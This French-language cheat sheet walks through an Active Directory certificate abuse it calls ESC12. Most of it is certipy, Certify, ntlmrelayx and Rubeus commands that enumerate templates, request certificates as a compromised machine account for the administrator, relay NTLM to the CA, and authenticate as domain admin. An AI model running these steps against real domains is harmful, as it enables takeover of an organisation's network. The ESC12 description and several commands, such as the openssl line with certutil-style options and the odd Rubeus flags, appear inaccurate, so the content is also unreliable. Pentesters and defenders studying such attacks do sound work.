### Description

ESC12 exploite des modèles de certificats qui autorisent l'enrollment via des comptes machine sans vérifications appropriées sur l'identité du demandeur, permettant à un attaquant contrôlant un compte machine ou ayant compromis un système de demander des certificats pour d'autres entités via l'usurpation de l'identité machine.

### Conditions vulnérables

Un modèle de certificat est vulnérable à ESC12 si :

1. **Enrollment autorisé pour les machines** - Le modèle permet l'enrollment via des comptes machine (`Domain Computers`)
2. **Authentification client activée** - Le modèle permet l'authentification (`Client Authentication`)
3. **Vérifications d'identité insuffisantes** - Pas de validation stricte de l'identité du demandeur machine
4. **Permissions trop permissives** - Les comptes machine peuvent demander des certificats pour d'autres entités

---

### Exploitation depuis linux (certipy)

Enumération des templates vulnérables :

```bash
certipy find -u user@domain.local -p password -target dc01.domain.local

# Énumération avec focus sur les permissions des comptes machine
certipy find -u user@domain.local -p password -target dc01.domain.local -json -output vulnerabilities.json 

# Recherche spécifique des templates accessibles aux Domain Computers
certipy find -u user@domain.local -p password -target dc01.domain.local -vulnerable | grep -A10 -B5 "Domain Computers\|MACHINE\\\$"
```

Exploitation avec un compte machine compromis :

```bash
# Utilisation d'un compte machine pour demander un certificat
certipy req -u 'WORKSTATION01$' -hashes :ntlm_hash -target dc01.domain.local -ca 'domain-DC01-CA' -template 'MachineTemplate' -upn administrator@domain.local

# Avec authentification Kerberos si disponible
certipy req -u 'WORKSTATION01$' -k -no-pass -target dc01.domain.local -ca 'domain-DC01-CA' -template 'MachineTemplate' -dns dc01.domain.local
```

Exploitation via relay depuis un système compromis :

```bash
# Utilisation du relay depuis une machine compromise
impacket-ntlmrelayx -t https://dc01.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template MachineTemplate --delegate-access --escalate-user administrator

# Avec coercition depuis la machine compromise
certipy relay -ca http://dc01.domain.local/certsrv/certfnsh.asp -template MachineTemplate -target dc01.domain.local -account 'WORKSTATION01$'
```

Authentification avec le certificat obtenu :

```bash
# Authentification avec le certificat d'administrateur
certipy auth -pfx administrator.pfx -username administrator -domain domain.local -dc-ip 192.168.1.10

# Si certificat machine obtenu, utilisation pour Silver Ticket
certipy auth -pfx 'dc01$.pfx' -username 'DC01$' -domain domain.local -dc-ip 192.168.1.10
```

---

### Exploitation depuis windows (certify.exe)

Enumération des templates vulnérables :

```powershell
# Énumération des modèles vulnérables 
Certify.exe find /vulnerable 
# Filtrage spécifique ESC12 - templates accessibles aux machines
Certify.exe find /vulnerable | findstr "Domain Computers\|MACHINE"

# Vérification manuelle des permissions sur les templates
Get-ADObject -Filter {objectClass -eq "pKICertificateTemplate"} -Properties * | ForEach-Object {
    $acl = Get-Acl -Path "AD:$($_.DistinguishedName)"
    $machinePerms = $acl.Access | Where-Object {
        $_.IdentityReference -match "Domain Computers" -and
        $_.ActiveDirectoryRights -match "Enroll"
    }
    if ($machinePerms) {
        [PSCustomObject]@{
            Template = $_.Name
            MachinePermissions = $machinePerms
        }
    }
}
```

Exploitation depuis une machine compromise :

```powershell
# Utilisation du compte machine local pour demander un certificat
Certify.exe request /ca:DC01.domain.local\domain-DC01-CA /template:MachineTemplate /machine

# Avec SAN spécifique si le template le permet
Certify.exe request /ca:DC01.domain.local\domain-DC01-CA /template:MachineTemplate /altname:administrator@domain.local /machine

# Utilisation de credentials machine explicites
Certify.exe request /ca:DC01.domain.local\domain-DC01-CA /template:MachineTemplate /user:WORKSTATION01$ /password:machine_password
```

Authentification avec le certificat obtenu :

```powershell
# Conversion du certificat si nécessaire
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx 

# Authentification avec le certificat 
Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:password123 /ptt /machine

# Pour un compte machine
Rubeus.exe asktgt /user:WORKSTATION01$ /certificate:cert.pfx /password:password123 /ptt
```